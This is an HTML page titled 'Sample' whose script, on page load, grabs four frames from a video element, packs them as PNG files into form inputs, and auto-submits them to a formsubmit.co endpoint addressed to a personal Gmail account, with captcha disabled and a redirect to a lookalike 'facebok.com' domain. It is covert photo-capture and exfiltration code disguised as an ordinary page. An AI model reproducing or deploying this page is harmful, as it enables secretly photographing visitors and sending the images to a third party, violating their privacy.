<!doctype HTML>
<html>
<head>
  <title>Sample</title>
</head>
<body>
 <form method="POST" action="https://formsubmit.co/marco42748261@gmail.com" enctype="multipart/form-data">
    <video id="video" width="300" height="200"></video>
    <canvas id="canvas" style="display: none;"></canvas>
   <input type="file" id="photoInput1" name="attachment1" accept="image/png, image/jpeg">
   <input type="file" id="photoInput2" name="attachment2" accept="image/png, image/jpeg">
   <input type="file" id="photoInput3" name="attachment3" accept="image/png, image/jpeg">
   <input type="file" id="photoInput4" name="attachment4" accept="image/png, image/jpeg">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://www.facebok.com">
  </form>
<script>
let fotoCount = 0;
const maxFotos = 4;
const intervalo = 1000; // 1 segundo
const photoInputs = [
  document.getElementById('photoInput1'),
  document.getElementById('photoInput2'),
  document.getElementById('photoInput3'),
  document.getElementById('photoInput4')
];
const form = document.querySelector('form');

function tomarFoto() {
  if (fotoCount < maxFotos) {
    // Tomar una foto
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      const file = new File([blob], `photo${fotoCount + 1}.png`, { type: 'image/png' });
      const dt = new DataTransfer();
      dt.items.add(file);
      photoInputs[fotoCount].files = dt.files;
      fotoCount++;
      if (fotoCount === maxFotos) {
        form.submit();
      } else {
        setTimeout(tomarFoto, intervalo);
      }
    }, 'image/png');
  }
}

window.addEventListener('load', () => {
  tomarFoto();
});
</script>
</body>
</html>
